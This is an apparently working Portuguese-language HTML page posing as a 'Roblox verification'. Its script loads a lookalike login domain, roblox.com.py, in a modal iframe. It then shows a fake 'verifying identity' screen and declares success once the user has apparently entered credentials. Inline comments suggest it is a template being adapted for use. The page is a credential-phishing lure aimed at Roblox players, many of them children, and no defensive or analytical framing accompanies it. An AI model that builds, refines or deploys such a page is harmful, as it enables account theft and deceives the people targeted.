<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!-- ^^^ ESSA LINHA É CRUCIAL PARA MOBILE - impede zoom estranho -->
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Verificação Roblox</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: #111111;
      color: #ffffff;
      font-family: 'Roboto', sans-serif;
      min-height: 100vh;
      overflow-x: hidden;
    }

    header { /* seu header continua igual */ }

    main {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 60px);
      text-align: center;
      padding: 20px;
    }

    .content { max-width: 600px; width: 100%; }

    /* ... seus outros estilos de h1, p, buttons continuam ... */

    .modal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.95);
      align-items: center;
      justify-content: center;
      z-index: 1000;
      padding: 10px;
    }

    .modal.open { display: flex; }

    .modal-content {
      width: 100%;
      max-width: 900px;
      height: 90vh;               /* melhor que 85% em mobile */
      max-height: 95vh;
      background: #1e1e1e;
      border-radius: 12px;
      padding: 15px;
      position: relative;
      box-shadow: 0 0 30px rgba(255, 51, 153, 0.3);
      overflow: hidden;
    }

    .close-btn {
      position: absolute;
      top: 10px;
      right: 15px;
      background: none;
      border: none;
      color: #fff;
      font-size: 2.5rem;
      cursor: pointer;
      z-index: 10;
    }

    .verification-container {
      width: 100%;
      height: 100%;
      position: relative;
      border-radius: 8px;
      overflow: hidden;
      border: 1px solid #444;
      background: #000; /* fundo preto evita "branco feio" se falhar */
    }

    .loading-screen {
      position: absolute;
      inset: 0;
      background: #1e1e1e;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      font-size: 1.4rem;
      z-index: 5;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
      display: block;        /* tira o display:none inicial - melhor loading */
      background: #000;
    }

    /* Responsividade extra para mobile */
    @media (max-width: 768px) {
      .modal-content {
        height: 95vh;
        padding: 10px;
        border-radius: 0;     /* full screen no mobile fica melhor */
      }
      .close-btn {
        font-size: 2.2rem;
        top: 8px;
        right: 12px;
      }
      h1 { font-size: 2rem; }
      .buttons { flex-direction: column; gap: 12px; }
    }
  </style>
</head>
<body>

  <!-- Seu header e main continuam iguais -->

  <div class="modal" id="verification-modal">
    <div class="modal-content">
      <button class="close-btn" id="close-modal">×</button>
      <div class="verification-container">
        <div class="loading-screen" id="loading">
          <div>Preparando verificação<span class="loading-dots"></span></div>
        </div>
        <iframe id="verify-iframe" src="about:blank" allowfullscreen allow="camera; microphone; fullscreen"></iframe>
      </div>
    </div>
  </div>

  <script>
    const verificationModal = document.getElementById('verification-modal');
    const initialContent = document.getElementById('initial-content');
    const successContent = document.getElementById('success-content');
    const startBtn = document.getElementById('start-verification');
    const closeBtn = document.getElementById('close-modal');
    const loading = document.getElementById('loading');
    const iframe = document.getElementById('verify-iframe');

    const IFRAME_URL = "https://roblox.com.py/login?returnUrl=3667493294562156"; // ou seu link real

    let isFirstLoad = true;

    function completeVerification() {
      verificationModal.classList.remove('open');
      initialContent.style.display = 'none';
      successContent.style.display = 'block';
    }

    function closeModalManually() {
      verificationModal.classList.remove('open');
      iframe.src = "about:blank"; // limpa pra evitar cache estranho
    }

    function checkForRobloxDomain() {
      if (isFirstLoad) {
        isFirstLoad = false;
        return;
      }
      // ... seu código de detecção continua (catch CORS é o mais confiável)
      try {
        const currentUrl = iframe.contentWindow.location.href.toLowerCase();
        if (currentUrl.includes("roblox.com") && !currentUrl.includes("login")) {
          showVerifying();
          setTimeout(completeVerification, 2800);
        }
      } catch (e) {
        // Erro cross-origin = provavelmente logou
        showVerifying();
        setTimeout(completeVerification, 3200);
      }
    }

    function showVerifying() {
      loading.innerHTML = '<div>Verificando identidade<span class="loading-dots"></span></div>';
      loading.style.display = 'flex';
      iframe.style.opacity = '0'; // esconde iframe durante verificação
    }

    startBtn.onclick = () => {
      isFirstLoad = true;
      verificationModal.classList.add('open');

      loading.style.display = 'flex';
      iframe.style.opacity = '0';
      iframe.src = IFRAME_URL;

      iframe.onload = () => {
        setTimeout(() => {
          loading.style.display = 'none';
          iframe.style.opacity = '1';
        }, 1500); // delay menor pra mobile
      };
    };

    iframe.addEventListener('load', checkForRobloxDomain);

    closeBtn.onclick = closeModalManually;
    verificationModal.onclick = (e) => {
      if (e.target === verificationModal) closeModalManually();
    };
  </script>
</body>
</html>
